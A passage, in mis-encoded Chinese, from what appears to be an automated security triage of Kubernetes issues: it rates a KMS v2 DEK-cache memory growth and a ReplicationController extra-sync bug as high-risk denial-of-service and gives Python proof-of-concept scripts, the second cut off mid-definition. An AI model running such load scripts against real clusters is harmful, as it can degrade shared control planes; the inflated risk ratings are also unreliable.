3.  **è§¦å‘æ¡ä»¶**: æ¼æ´çš„æ ¸å¿ƒå‰ææ˜¯é›†ç¾¤ä¸­å­˜åœ¨ä½¿ç”¨æ—§å¯†é’¥åŠ å¯†çš„èµ„æºï¼Œè¿™åœ¨å¸¸è§„çš„è¿ç»´æ“ä½œï¼ˆå¦‚èŠ‚ç‚¹å‡çº§ã€API Server é‡å¯ï¼‰ä¸­å¾ˆå®¹æ˜“å‘ç”Ÿï¼Œå°¤å…¶æ˜¯å½“ç®¡ç†å‘˜å¿½ç•¥äº†`etcd`ä¸­åŠ å¯†æ•°æ®çš„è¿ç§»æ­¥éª¤æ—¶ã€‚
4.  **åˆ©ç”¨**: å°½ç®¡è§¦å‘å†…å­˜å¢é•¿éœ€è¦è¯»å–å’Œåˆ›å»º Secret çš„æƒé™ï¼ˆéåªè¯»æƒé™ï¼‰ï¼Œä½†æ­¤æ¼æ´çš„å½±å“æ˜¯å…¨å±€æ€§çš„ã€‚æ ¹æ®åˆ¤æ–­æ ‡å‡†ç¬¬8æ¡ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡æ­¤æ¼æ´å½±å“åˆ°æ‰€æœ‰å…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬ç®¡ç†å‘˜ï¼‰ï¼Œå¯¼è‡´æ•´ä¸ªæœåŠ¡ç˜«ç—ªï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
5.  **CVSS 3.1 è¯„åˆ†**: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`ï¼Œå¾—åˆ†ä¸º **7.5**ï¼Œå±äºé«˜ï¼ˆHighï¼‰é£é™©çº§åˆ«ã€‚

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubernetes API Server ä¸­ä¸ KMS (Key Management Service) v2 åŠ å¯†é›†æˆç›¸å…³çš„æ½œåœ¨å†…å­˜æ³„æ¼é—®é¢˜ã€‚

é—®é¢˜æ ¹æºåœ¨äº API Server ä¸­ç”¨äºè§£å¯†æ•°æ®åŠ å¯†å¯†é’¥ï¼ˆDEKï¼‰çš„ç¼“å­˜æœºåˆ¶ã€‚å…·ä½“æ¥è¯´ï¼š
1.  **DEK ç§å­è½®æ¢**ï¼šæ¯å½“ API Server é‡å¯æˆ– KMS æ’ä»¶è¿”å›çš„å¯†é’¥IDå‘ç”Ÿå˜åŒ–æ—¶ï¼ŒAPI Server éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ DEK ç§å­ï¼ˆDEK seedï¼‰ã€‚
2.  **ç¼“å­˜åŠ è½½**ï¼šå½“ API Server éœ€è¦è§£å¯†ä¸€ä¸ªä½¿ç”¨æ—§ DEK åŠ å¯†çš„èµ„æºï¼ˆå¦‚ Secretï¼‰æ—¶ï¼Œå®ƒä¼šä½¿ç”¨å¯¹åº”çš„æ—§ DEK ç§å­é‡æ–°ç”Ÿæˆ DEKï¼Œå¹¶å°†è¿™ä¸ªè§£å¯†å™¨å®ä¾‹æ·»åŠ åˆ°ç¼“å­˜ä¸­ï¼Œä»¥ä¾¿åç»­é‡å¤ä½¿ç”¨ã€‚
3.  **ç¼“å­˜æ— ä¸Šé™**ï¼šæ ¹æ® Issue ä¸­å¼•ç”¨çš„ä»£ç æ³¨é‡Šï¼Œè¿™ä¸ªç¼“å­˜çš„å¤§å°åœ¨ä¸€æ®µæ—¶é—´å†…ï¼ˆ`cacheTTL`ï¼Œé»˜è®¤ä¸ºä¸€å¤©ï¼‰æ²¡æœ‰æ˜ç¡®çš„ä¸Šé™ã€‚
4.  **è§¦å‘æ¡ä»¶**ï¼šå¦‚æœé›†ç¾¤ç®¡ç†å‘˜åœ¨è½®æ¢äº† KMS ä¸»å¯†é’¥æˆ–å¤šæ¬¡é‡å¯ API Server åï¼Œæ²¡æœ‰æ‰§è¡Œå¯¹æ‰€æœ‰åŠ å¯†èµ„æºï¼ˆç‰¹åˆ«æ˜¯ Secretsï¼‰çš„é‡æ–°åŠ å¯†æ“ä½œï¼Œé‚£ä¹ˆ etcd ä¸­å°±ä¼šå­˜åœ¨å¤§é‡ç”±ä¸åŒæ—¶æœŸçš„ DEK åŠ å¯†çš„èµ„æºã€‚
5.  **å†…å­˜çˆ†ç‚¸**ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å®¢æˆ·ç«¯ï¼ˆæˆ–æ§åˆ¶å™¨ï¼‰é¢‘ç¹è¯»å–è¿™äº›ä½¿ç”¨æ—§å¯†é’¥åŠ å¯†çš„èµ„æºæ—¶ï¼ŒAPI Server ä¼šä¸ºæ¯ä¸€ä¸ªä¸åŒçš„æ—§ DEK ç§å­åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªç¼“å­˜æ¡ç›®ã€‚éšç€æ—¶é—´çš„æ¨ç§»å’Œ API Server çš„é‡å¯æ¬¡æ•°å¢åŠ ï¼Œæ´»è·ƒçš„ DEK ç§å­æ•°é‡ä¼šæŒç»­å¢å¤šï¼Œå¯¼è‡´ç¼“å­˜æŒç»­å¢é•¿ï¼Œæœ€ç»ˆå¯èƒ½è€—å°½ API Server çš„å†…å­˜ï¼Œå¼•å‘ OOM (Out of Memory) Killï¼Œé€ æˆæ•´ä¸ªæ§åˆ¶å¹³é¢æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚

è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ç”±èµ„æºç®¡ç†ä¸å½“å¯¼è‡´çš„æ‹’ç»æœåŠ¡æ¼æ´ã€‚æ”»å‡»è€…ï¼ˆæˆ–æ™®é€šç”¨æˆ·ï¼‰è™½ç„¶ä¸èƒ½ç›´æ¥é‡å¯ API Serverï¼Œä½†åœ¨ä¸€ä¸ªé•¿æœŸè¿è¡Œä¸”æœªè¿›è¡ŒåŠ å¯†æ•°æ®è¿ç§»çš„é›†ç¾¤ä¸­ï¼Œè¿™ç§ä¸ç¨³å®šçš„çŠ¶æ€æ˜¯è‡ªç„¶å½¢æˆçš„ã€‚æ­¤æ—¶ï¼Œä¸€ä¸ªæœ‰æƒè¯»å–å’Œåˆ›å»º Secret çš„ä½æƒé™ç”¨æˆ·ï¼Œé€šè¿‡é¢‘ç¹è¯»å†™æ“ä½œï¼Œå°±å¯ä»¥åŠ é€Ÿå†…å­˜æ¶ˆè€—ï¼Œæœ€ç»ˆå¯¼è‡´ API Server å´©æºƒï¼Œå½±å“é›†ç¾¤ä¸­çš„æ‰€æœ‰ç”¨æˆ·ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import time
import uuid
import sys
from datetime import datetime, timedelta

# --- é…ç½® ---
# ç”¨äºåˆ›å»ºæµ‹è¯• Secret çš„å‘½åç©ºé—´
TEST_NAMESPACE = "kms-cache-poc-ns"
# è„šæœ¬æ€»è¿è¡Œæ—¶é—´ï¼ˆç§’ï¼‰
TOTAL_DURATION_SECONDS = 110
# åˆ›å»ºâ€œæ—§â€Secret çš„æ•°é‡
NUM_OLD_SECRETS = 50

def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡ŒPOCçš„å…¨éƒ¨é€»è¾‘ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        kubernetes.config.load_kube_config()
        # åˆå§‹åŒ– CoreV1Api å®¢æˆ·ç«¯
        api = kubernetes.client.CoreV1Api()
        print("æˆåŠŸè¿æ¥åˆ° Kubernetes é›†ç¾¤ã€‚")
    except Exception as e:
        print(f"é”™è¯¯: æ— æ³•è¿æ¥åˆ° Kubernetes é›†ç¾¤ã€‚è¯·ç¡®ä¿ kubeconfig é…ç½®æ­£ç¡®ã€‚è¯¦æƒ…: {e}")
        return

    # 1. ä¸ºæµ‹è¯•åˆ›å»ºä¸€ä¸ªä¸“ç”¨çš„å‘½åç©ºé—´
    try:
        api.create_namespace(
            body=kubernetes.client.V1Namespace(
                metadata=kubernetes.client.V1ObjectMeta(name=TEST_NAMESPACE)
            )
        )
        print(f"å‘½åç©ºé—´ '{TEST_NAMESPACE}' å·²åˆ›å»ºã€‚")
    except kubernetes.client.ApiException as e:
        if e.status == 409:  # å‘½åç©ºé—´å·²å­˜åœ¨
            print(f"å‘½åç©ºé—´ '{TEST_NAMESPACE}' å·²å­˜åœ¨ï¼Œå°†é‡ç”¨ã€‚")
        else:
            print(f"åˆ›å»ºå‘½åç©ºé—´æ—¶å‡ºé”™: {e}")
            return

    old_secret_names = []

    print("\n--- é˜¶æ®µ 1: åˆ›å»ºä¸€æ‰¹ 'æ—§' Secret ---")
    print("æ­¤æ­¥éª¤æ¨¡æ‹Ÿåœ¨ä¸€ä¸ªå‡è®¾çš„ API Server é‡å¯ä¹‹å‰å·²ç»å­˜åœ¨çš„ Secretã€‚")
    print(f"æ­£åœ¨åˆ›å»º {NUM_OLD_SECRETS} ä¸ª 'æ—§' Secret...")
    for i in range(NUM_OLD_SECRETS):
        secret_name = f"old-secret-{uuid.uuid4().hex[:8]}"
        secret_body = kubernetes.client.V1Secret(
            metadata=kubernetes.client.V1ObjectMeta(name=secret_name),
            string_data={"key": f"old-data-{i}"}
        )
        try:
            api.create_namespaced_secret(namespace=TEST_NAMESPACE, body=secret_body)
            old_secret_names.append(secret_name)
            sys.stdout.write(f"\rå·²åˆ›å»º {i + 1}/{NUM_OLD_SECRETS} ä¸ª 'æ—§' Secretã€‚")
            sys.stdout.flush()
        except kubernetes.client.ApiException as e:
            print(f"\nåˆ›å»º Secret {secret_name} æ—¶å‡ºé”™: {e}")
    print("\n'æ—§' Secret åˆ›å»ºå®Œæˆã€‚")

    print("\n--- æ¨¡æ‹Ÿ API SERVER é‡å¯ ---")
    print("ç°åœ¨ï¼Œè¯·è®¾æƒ³ API Server å·²ç»é‡å¯ã€‚ä¸€ä¸ªæ–°çš„ DEK ç§å­ä¼šè¢«ç”Ÿæˆã€‚")
    print("å› æ­¤ï¼Œåˆšåˆšåˆ›å»ºçš„ 'æ—§' Secret ç°åœ¨æ˜¯ç”¨ 'æ—§' çš„ DEK åŠ å¯†çš„ã€‚\n")
    time.sleep(5)

    print(f"--- é˜¶æ®µ 2: æ¨¡æ‹Ÿé«˜è´Ÿè½½å·¥ä½œåœºæ™¯ (æŒç»­ {TOTAL_DURATION_SECONDS} ç§’) ---")
    print("æ­¤é˜¶æ®µå°†æŒç»­è¯»å– 'æ—§' Secretï¼ŒåŒæ—¶åˆ›å»º 'æ–°' Secretã€‚")
    print("è¯»å– 'æ—§' Secret ä¼šå¼ºåˆ¶ API Server å°†æ—§çš„ DEK åŠ è½½åˆ°å…¶ç¼“å­˜ä¸­ã€‚")

    start_time = datetime.now()
    end_time = start_time + timedelta(seconds=TOTAL_DURATION_SECONDS)
    
    new_secrets_created = 0
    reads_performed = 0

    while datetime.now() < end_time:
        # è¯»å–ä¸€ä¸ª "æ—§" Secret
        if old_secret_names:
            secret_to_read = old_secret_names[reads_performed % len(old_secret_names)]
            try:
                api.read_namespaced_secret(name=secret_to_read, namespace=TEST_NAMESPACE)
                reads_performed += 1
            except kubernetes.client.ApiException:
                # Secret å¯èƒ½å·²è¢«åˆ é™¤ï¼Œå¿½ç•¥é”™è¯¯
                pass

        # åˆ›å»ºä¸€ä¸ª "æ–°" Secret (ä½¿ç”¨å½“å‰çš„ DEK)
        new_secret_name = f"new-secret-{uuid.uuid4().hex[:8]}"
        secret_body = kubernetes.client.V1Secret(
            metadata=kubernetes.client.V1ObjectMeta(name=new_secret_name),
            string_data={"key": "this-is-new-data"}
        )
        try:
            api.create_namespaced_secret(namespace=TEST_NAMESPACE, body=secret_body)
            new_secrets_created += 1
        except kubernetes.client.ApiException:
            # åœ¨å¾ªç¯ä¸­å¿½ç•¥åˆ›å»ºé”™è¯¯
            pass

        elapsed = (datetime.now() - start_time).seconds
        sys.stdout.write(f"\rå·²ç”¨æ—¶: {elapsed}s | 'æ—§' Secret è¯»å–æ¬¡æ•°: {reads_performed} | 'æ–°' Secret åˆ›å»ºæ•°é‡: {new_secrets_created}")
        sys.stdout.flush()
        time.sleep(0.1)  # çŸ­æš‚å»¶è¿Ÿä»¥é¿å…è¯·æ±‚è¿‡äºé¢‘ç¹

    print("\n\n--- æ¨¡æ‹Ÿç»“æŸ ---")
    print("è„šæœ¬å·²åœ¨ä¸€ä¸ªå‡è®¾çš„é‡å¯åæ¨¡æ‹Ÿäº†é«˜é¢‘è¯»å†™ç¯å¢ƒã€‚")
    print("åœ¨ä¸€ä¸ªå­˜åœ¨æ­¤æ¼æ´çš„ç³»ç»Ÿä¸­ï¼Œè¿™ç§æ´»åŠ¨å°†å¯¼è‡´ KMS è½¬æ¢å™¨ç¼“å­˜å¢é•¿ï¼Œ")
    print("å› ä¸º API Server å¿…é¡»ç¼“å­˜æ‰€æœ‰è¢«è¯»å–çš„ 'æ—§' Secret å¯¹åº”çš„ DEKã€‚")

    # 3. æ¸…ç†åˆ›å»ºçš„èµ„æº
    print("\n--- é˜¶æ®µ 3: æ¸…ç†å·²åˆ›å»ºçš„èµ„æº ---")
    try:
        api.delete_namespace(name=TEST_NAMESPACE, body=kubernetes.client.V1DeleteOptions())
        print(f"å‘½åç©ºé—´ '{TEST_NAMESPACE}' åŠå…¶æ‰€æœ‰èµ„æºæ­£åœ¨è¢«åˆ é™¤ã€‚")
    except kubernetes.client.ApiException as e:
        print(f"åˆ é™¤å‘½åç©ºé—´ '{TEST_NAMESPACE}' æ—¶å‡ºé”™: {e}")
        print(f"æ‚¨å¯èƒ½éœ€è¦æ‰‹åŠ¨åˆ é™¤å®ƒ: kubectl delete namespace {TEST_NAMESPACE}")

# ç›´æ¥æ‰§è¡Œ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬çš„ç›®çš„æ˜¯æ¨¡æ‹Ÿè§¦å‘æ‰€è¿°æ¼æ´çš„ç‰¹å®š API è®¿é—®æ¨¡å¼ã€‚å®ƒå¹¶ä¸èƒ½ç›´æ¥é‡å¯ API Serverï¼Œä¹Ÿæ— æ³•ç›´æ¥è¡¡é‡ API Server çš„å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä½†å®ƒå¤ç°äº†å¯¼è‡´å†…å­˜å¢é•¿çš„å®¢æˆ·ç«¯è¡Œä¸ºã€‚

è„šæœ¬å·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š
1.  **ç¯å¢ƒè®¾ç½®**: è„šæœ¬é¦–å…ˆè¿æ¥åˆ° Kubernetes é›†ç¾¤ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªåä¸º `kms-cache-poc-ns` çš„ç‹¬ç«‹å‘½åç©ºé—´ï¼Œä»¥ç¡®ä¿æ‰€æœ‰æ“ä½œéƒ½åœ¨éš”ç¦»çš„ç¯å¢ƒä¸­è¿›è¡Œï¼Œä¸ä¼šå½±å“é›†ç¾¤çš„å…¶ä»–éƒ¨åˆ†ã€‚
2.  **åˆ›å»ºâ€œæ—§â€æ•°æ®**: è„šæœ¬é¦–å…ˆåˆ›å»ºäº†`50`ä¸ª Secretã€‚è¿™ä¸€æ­¥æ˜¯ä¸ºäº†æ¨¡æ‹Ÿåœ¨ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„é›†ç¾¤ä¸­ï¼Œå·²ç»å­˜åœ¨çš„ã€ç”±æ—§çš„ DEKï¼ˆæ•°æ®åŠ å¯†å¯†é’¥ï¼‰åŠ å¯†çš„èµ„æºã€‚
3.  **æ¨¡æ‹Ÿé‡å¯**: è„šæœ¬é€šè¿‡æ‰“å°æç¤ºä¿¡æ¯å¹¶æš‚åœ5ç§’ï¼Œæ¥**è±¡å¾æ€§åœ°æ¨¡æ‹Ÿ** API Server çš„ä¸€æ¬¡é‡å¯ã€‚åœ¨çœŸå®åœºæ™¯ä¸­ï¼Œé‡å¯ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ DEK ç§å­ã€‚æ­¤ååˆ›å»ºçš„æ‰€æœ‰æ–° Secret éƒ½ä¼šä½¿ç”¨æ–°çš„ DEK åŠ å¯†ã€‚
4.  **æ¨¡æ‹Ÿé«˜è´Ÿè½½**: è„šæœ¬è¿›å…¥ä¸€ä¸ªæŒç»­çº¦2åˆ†é’Ÿçš„å¾ªç¯ã€‚åœ¨å¾ªç¯ä¸­ï¼Œå®ƒæ‰§è¡Œä¸¤ä¸ªå…³é”®æ“ä½œï¼š
    *   **è¯»å–â€œæ—§â€Secret**: å¾ªç¯åœ°è¯»å–åœ¨ç¬¬ä¸€é˜¶æ®µåˆ›å»ºçš„â€œæ—§â€Secretã€‚è¿™ä¸ª`read`æ“ä½œä¼šå¼ºåˆ¶ API Server è§£å¯†æ•°æ®ã€‚å¦‚æœè¯¥ Secret æ˜¯ç”¨æ—§çš„ DEK åŠ å¯†çš„ï¼ŒAPI Server å°±å¿…é¡»å°†å¯¹åº”çš„è§£å¯†å™¨åŠ è½½åˆ°å…¶ KMS ç¼“å­˜ä¸­ã€‚
    *   **åˆ›å»ºâ€œæ–°â€Secret**: åŒæ—¶ï¼Œè„šæœ¬ä¸æ–­åˆ›å»ºæ–°çš„ Secretï¼Œä»¥æ¨¡æ‹Ÿä¸€ä¸ªæ­£å¸¸çš„ã€æ´»è·ƒçš„é›†ç¾¤å·¥ä½œè´Ÿè½½ã€‚
5.  **è§¦å‘æ¼æ´**: è¿™ç§â€œé¢‘ç¹è¯»å–æ—§èµ„æºï¼ŒåŒæ—¶åˆ›å»ºæ–°èµ„æºâ€çš„æ¨¡å¼ï¼Œåœ¨ä¸€ä¸ªç»è¿‡å¤šæ¬¡é‡å¯ä¸”æœªå¯¹æ—§æ•°æ®è¿›è¡Œé‡åŠ å¯†çš„é›†ç¾¤ä¸Šï¼Œä¼šè¿«ä½¿ API Server ç¼“å­˜ä¸­é©»ç•™å¤§é‡ä¸åŒç‰ˆæœ¬çš„ DEK è§£å¯†å™¨ï¼Œä»è€Œå¯¼è‡´å…¶å†…å­˜å ç”¨æŒç»­æ”€å‡ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´æœåŠ¡å´©æºƒã€‚
6.  **æ¸…ç†**: è„šæœ¬æ‰§è¡Œå®Œæ¯•åï¼Œä¼šè‡ªåŠ¨åˆ é™¤ä¹‹å‰åˆ›å»ºçš„å‘½åç©ºé—´åŠå…¶ä¸­çš„æ‰€æœ‰ Secretï¼Œå°†é›†ç¾¤æ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚

è¦çœŸæ­£è§‚å¯Ÿåˆ°å†…å­˜å¢é•¿ï¼Œéœ€è¦åœ¨æ‰§è¡Œæ­¤è„šæœ¬çš„åŒæ—¶ï¼Œä½¿ç”¨ `top` æˆ– `kubectl top pod -n kube-system <apiserver-pod-name>` ç­‰å·¥å…·ç›‘æ§ API Server Pod çš„å†…å­˜ä½¿ç”¨æƒ…å†µã€‚

---


## Issue #131821 ReplicationController cannot fully reconcile with DeploymentReplicaSetTerminatingReplicas FG enabled

- Issue é“¾æ¥ï¼š[#131821](https://github.com/kubernetes/kubernetes/issues/131821)

### Issue å†…å®¹

#### What happened?

extra syncs in KCM log

```
replica_set_utils.go:67] "Updating status for : default/test, replicas 3->3 (need 3), fullyLabeledReplicas 3->3, readyReplicas 3->3, availableReplicas 3->3, terminatingReplicas nil->0, sequence No: 1->1" logger="replicationcontroller-controller"
```

This issue has been noticed and also desribed in https://github.com/kubernetes/kubernetes/pull/128546#discussion_r2017079581 by @liggitt 

#### What did you expect to happen?

no extra syncs

#### How can we reproduce it (as minimally and precisely as possible)?

create a ReplicationController with DeploymentReplicaSetTerminatingReplicas FG enabled

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.34.0-alpha.0.635+a5e3df5e6855d9
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesä¸­å¯ç”¨äº†`DeploymentReplicaSetTerminatingReplicas`ç‰¹æ€§é—¨ï¼ˆFeature Gateï¼‰åï¼Œ`ReplicationController`æ§åˆ¶å™¨æ— æ³•å®Œå…¨è¿›å…¥åŒæ­¥ï¼ˆreconcileï¼‰å®ŒæˆçŠ¶æ€çš„é—®é¢˜ã€‚

å…·ä½“æ¥è¯´ï¼Œå½“è¯¥ç‰¹æ€§é—¨å¯ç”¨æ—¶ï¼Œ`ReplicationController`çš„çŠ¶æ€ä¸­ `terminatingReplicas` å­—æ®µä¸º `nil`ã€‚ç„¶è€Œï¼Œç›¸å…³çš„è¾…åŠ©å‡½æ•°ä¼šå°†å…¶è®¡ç®—ä¸º `0`ã€‚æ§åˆ¶å™¨åœ¨æ¯”è¾ƒæœŸæœ›çŠ¶æ€å’Œå½“å‰çŠ¶æ€æ—¶ï¼Œä¼šè®¤ä¸º `nil` ä¸ç­‰äº `0`ï¼Œä»è€Œåˆ¤æ–­çŠ¶æ€ä¸ä¸€è‡´ã€‚è¿™å¯¼è‡´æ§åˆ¶å™¨ä¸æ–­åœ°å°è¯•æ›´æ–°`ReplicationController`å¯¹è±¡çš„çŠ¶æ€ï¼Œå³ä½¿å®é™…ä¸Šå¹¶æ²¡æœ‰çŠ¶æ€å˜æ›´ï¼ˆå¦‚æ—¥å¿—æ‰€ç¤º `replicas 3->3` ç­‰ï¼‰ã€‚

è¿™ä¸ªè¿‡ç¨‹ä¼šé™·å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼š
1.  æ§åˆ¶å™¨è¯»å–`ReplicationController`çŠ¶æ€ï¼Œå…¶ä¸­`status.terminatingReplicas`ä¸º`nil`ã€‚
2.  æ§åˆ¶å™¨è®¡ç®—æœŸæœ›çŠ¶æ€ï¼Œå¾—å‡º`terminatingReplicas`åº”ä¸º`0`ã€‚
3.  æ§åˆ¶å™¨å‘ç°`nil != 0`ï¼Œäºæ˜¯å‘API Serverå‘é€ä¸€ä¸ªstatus updateè¯·æ±‚ã€‚
4.  æ›´æ–°æ“ä½œå®Œæˆåï¼Œ`status.terminatingReplicas`å­—æ®µå¯èƒ½å› ä¸ºé€»è¾‘é—®é¢˜ä¾ç„¶ä¸º`nil`ï¼Œæˆ–è€…è¯¥å­—æ®µåœ¨`ReplicationController`çš„statusä¸­æœªè¢«æ­£ç¡®æŒä¹…åŒ–ã€‚
5.  æ§åˆ¶å™¨åœ¨ä¸‹ä¸€è½®åŒæ­¥ä¸­ï¼Œå†æ¬¡é‡å¤æ­¥éª¤1-4ã€‚

è¿™ç§æ— é™çš„åŒæ­¥å¾ªç¯ä¼šå¯¹Kubernetesæ§åˆ¶å¹³é¢é€ æˆå½±å“ï¼š
1.  **å¢åŠ kube-controller-managerçš„CPUå’Œå†…å­˜æ¶ˆè€—**ï¼šæ§åˆ¶å™¨æŒç»­è¿›è¡Œä¸å¿…è¦çš„å·¥ä½œã€‚
2.  **å¢åŠ kube-apiserverçš„è´Ÿè½½**ï¼šæ¯ä¸ªå¾ªç¯éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªå¯¹API Serverçš„å†™è¯·æ±‚ï¼ˆstatus updateï¼‰ã€‚
3.  **å¢åŠ etcdçš„è´Ÿè½½**ï¼šAPI Serverçš„æ¯æ¬¡å†™è¯·æ±‚æœ€ç»ˆéƒ½ä¼šå†™å…¥etcdï¼Œå¯¼è‡´etcdçš„æ•°æ®åº“å‹åŠ›å¢å¤§ã€‚

å¦‚æœä¸€ä¸ªæ”»å‡»è€…æ‹¥æœ‰åœ¨æŸä¸ªå‘½åç©ºé—´ä¸­åˆ›å»º`ReplicationController`çš„æƒé™ï¼Œä»–/å¥¹å°±å¯ä»¥é€šè¿‡åˆ›å»ºå¤§é‡çš„`ReplicationController`å¯¹è±¡æ¥æ”¾å¤§è¿™ä¸ªé—®é¢˜ï¼Œä»è€Œå¯¹æ•´ä¸ªé›†ç¾¤çš„æ§åˆ¶å¹³é¢ï¼ˆkube-controller-manager, kube-apiserver, etcdï¼‰å‘èµ·æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤ç®¡ç†æ“ä½œç¼“æ…¢ç”šè‡³å®Œå…¨ä¸å¯ç”¨ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
- **è§„åˆ™5**ï¼šè¯¥æ”»å‡»éœ€è¦æ”»å‡»è€…å…·å¤‡`create`æƒé™ï¼Œå±äºéåªè¯»æƒé™ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ç±»DoSæ”»å‡»é£é™©ä¼šè¢«é™çº§ã€‚
- **è§„åˆ™8**ï¼šè¿™æ˜¯ä¸€ä¸ªå¤šç”¨æˆ·åœºæ™¯ã€‚ä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ˆåœ¨è‡ªå·±çš„å‘½åç©ºé—´æœ‰åˆ›å»ºRCçš„æƒé™ï¼‰çš„è¡Œä¸ºå¯ä»¥å½±å“åˆ°æ•´ä¸ªé›†ç¾¤çš„æ§åˆ¶å¹³é¢ï¼Œä»è€Œå½±å“åˆ°æ‰€æœ‰å…¶ä»–ç”¨æˆ·ï¼ŒåŒ…æ‹¬æ›´é«˜æƒé™çš„ç®¡ç†å‘˜ã€‚è¿™ç§è·¨ç§Ÿæˆ·çš„å½±å“æ˜¾è‘—æå‡äº†é£é™©ç­‰çº§ã€‚

ç»¼åˆæ¥çœ‹ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·èƒ½å¤Ÿå¯¹æ•´ä¸ªé›†ç¾¤çš„å¯ç”¨æ€§é€ æˆä¸¥é‡å½±å“ï¼Œè¿™æ„æˆäº†é«˜é£é™©çš„å®‰å…¨æ¼æ´ã€‚æ ¹æ®CVSS 3.1è¯„åˆ†ï¼Œå…¶å‘é‡ä¸º `AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H`ï¼Œå¾—åˆ†ä¸º**8.2 (High)**ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜åº”è¢«åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import time
import os
import sys
import threading

# POC æ‰§è¡Œçš„é»˜è®¤è¶…æ—¶æ—¶é—´ (ç§’)
POC_TIMEOUT = 120

def main():
    """
    ä¸»å‡½æ•°ï¼Œç”¨äºæ‰§è¡ŒPoC
    """
    print("--- Kubernetes ReplicationController DoS PoC ---")
    
    # è®¾ç½®ä¸€ä¸ªå…¨å±€è¶…æ—¶å®šæ—¶å™¨
    timeout_event = threading.Event()
    def timeout_exit():
        print(f"[*] PoCæ‰§è¡Œè¶…è¿‡ {POC_TIMEOUT} ç§’ï¼Œè¶…æ—¶é€€å‡ºã€‚")
        timeout_event.set()
        
    timer = threading.Timer(POC_TIMEOUT, timeout_exit)
    timer.start()

    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        try:
            print("[*] å°è¯•ä»é»˜è®¤è·¯å¾„åŠ è½½ kubeconfig...")
            kubernetes.config.load_kube_config()
            print("[+] Kubeconfig åŠ è½½æˆåŠŸã€‚")
        except Exception as e:
            print(f"[-] åŠ è½½ kubeconfig å¤±è´¥: {e}", file=sys.stderr)
            print("[-] è¯·ç¡®ä¿æ‚¨çš„ç¯å¢ƒä¸­é…ç½®äº†æœ‰æ•ˆçš„ kubeconfig æ–‡ä»¶ã€‚", file=sys.stderr)
            return

        # åˆ›å»º CoreV1Api å®¢æˆ·ç«¯
        api = kubernetes.client.CoreV1Api()
        
        # å®šä¹‰PoCæ‰€éœ€çš„èµ„æºåç§°
        namespace = "poc-rc-dos-ns"
        rc_name = "poc-rc-dos"
        
        print(f"[*] å‡†å¤‡åœ¨å‘½åç©ºé—´ '{namespace}' ä¸­åˆ›å»º ReplicationController '{rc_name}'...")

        # æ¸…ç†ä¹‹å‰çš„é—ç•™èµ„æº
        cleanup(api, namespace, rc_name, timeout_event)

        # 1. åˆ›å»ºå‘½åç©ºé—´
        ns_body = kubernetes.client.V1Namespace(metadata=kubernetes.client.V1ObjectMeta(name=namespace))
        try:
            print(f"[*] æ­£åœ¨åˆ›å»ºå‘½åç©ºé—´ '{namespace}'...")
            api.create_namespace(body=ns_body)
            print(f"[+] å‘½åç©ºé—´ '{namespace}' åˆ›å»ºæˆåŠŸã€‚")
        except kubernetes.client.ApiException as e:
            if e.status == 409: # Already exists
                print(f"[*] å‘½åç©ºé—´ '{namespace}' å·²å­˜åœ¨ï¼Œç»§ç»­æ‰§è¡Œã€‚")
            else:
                print(f"[-] åˆ›å»ºå‘½åç©ºé—´å¤±è´¥: {e}", file=sys.stderr)
                return
        
        if timeout_event.is_set(): return

        # 2. å®šä¹‰ ReplicationController
        rc_body = {
            "apiVersion": "v1",
            "kind": "ReplicationController",
            "metadata": {
                "name": rc_name,
                "namespace": namespace
            },
            "spec": {
                "replicas": 1,
                "selector": {
                    "app": "nginx"
                },
                "template": {
                    "metadata": {
                        "labels": {
                            "app": "nginx"
                        }
                    },
                    "spec": {
